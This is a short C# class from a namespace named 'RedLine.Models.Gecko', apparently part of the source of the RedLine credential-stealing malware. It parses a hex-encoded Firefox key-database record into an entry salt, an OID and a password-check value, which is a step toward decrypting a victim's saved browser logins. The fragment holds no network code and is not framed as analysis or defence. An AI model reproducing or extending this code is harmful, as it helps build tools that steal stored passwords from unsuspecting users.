using System.Globalization;

namespace RedLine.Models.Gecko
{
	public class PasswordCheck
	{
		public string EntrySalt
		{
			get;
		}

		public string OID
		{
			get;
		}

		public string Passwordcheck
		{
			get;
		}

		public PasswordCheck(string DataToParse)
		{
			int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			EntrySalt = DataToParse.Substring(6, num);
			int num2 = DataToParse.Length - (6 + num + 36);
			OID = DataToParse.Substring(6 + num + 36, num2);
			Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}
	}
}
